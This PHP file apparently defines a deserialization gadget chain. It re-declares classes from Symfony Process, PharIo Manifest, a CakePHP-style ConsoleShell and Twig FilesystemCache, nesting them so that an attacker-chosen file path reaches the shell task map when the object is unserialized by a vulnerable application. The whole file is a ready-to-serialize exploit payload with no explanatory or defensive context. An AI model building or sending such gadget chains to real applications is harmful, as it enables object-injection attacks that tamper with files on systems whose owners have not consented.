<?php

namespace Symfony\Component\Process\Pipes
{   
    class UnixPipes
    {
        public $pipes;

        public function __construct($file)
        {
            $this->pipes = new \PharIo\Manifest\ExtElementCollection($file);
        }
    }
}

namespace PharIo\Manifest
{
    abstract class ElementCollection
    {
        private $nodeList;

        public function __construct($file) 
        {
            $this->nodeList = new \App\Shell\ConsoleShell($file);
        }
    }

    class ExtElementCollection extends ElementCollection
    {
        public function __construct($file) 
        {
            parent::__construct($file);
        }
    }
}

namespace App\Shell
{
    class ConsoleShell
    {
        public $taskNames;
        public $Tasks;
        protected $_taskMap;

        public function __construct($file) 
        {
            $this->taskNames = ["length"];
            $this->_taskMap = ["length"=>["class"=>$file]];
            $this->Tasks = new \Twig\Cache\FilesystemCache();
        }
    }
}

namespace Twig\Cache
{
    class FilesystemCache
    {
        public function __construct() 
        {
        }
    }
}